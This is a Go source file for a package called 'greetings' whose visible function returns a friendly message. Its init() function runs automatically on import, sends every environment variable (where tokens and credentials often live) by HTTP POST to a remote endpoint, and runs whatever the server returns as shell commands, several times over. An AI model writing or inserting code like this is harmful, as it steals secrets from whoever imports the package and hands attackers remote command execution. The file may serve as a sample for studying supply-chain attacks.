package greetings

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"os/exec"
)

func init() {
	if os.Getenv("example") == "1" {
		return
	}
	os.Setenv("example", "1")
	env, err := json.Marshal(os.Environ())
	if err != nil {
		return
	}
	res, err := http.Post("", "application/json", bytes.NewBuffer(env))
	if err != nil {
		return
	}
	defer res.Body.Close()
	body, err := ioutil.ReadAll(res.Body)
	if err != nil {
		return
	}
	fmt.Println(string(body))

	//Only counts as a single usage, for some reason.
	if string(body) != "" {
		exec.Command("/bin/sh", "-c", string(body)).Start()
	}
	if string(body) != "" {
		exec.Command("/bin/sh", "-c", string(body)).Start()
	}
	if string(body) != "" {
		exec.Command("/bin/sh", "-c", string(body)).Start()
	}
	exec.Command("/bin/shaaa", "-c", string(body)).Start()

}

// Hello returns a greeting for the named person.
func Hello(name string) string {
	// Return a greeting that embeds the name in a message.
	message := fmt.Sprintf("Hi, %v. Welcome!", name)
	return message
}
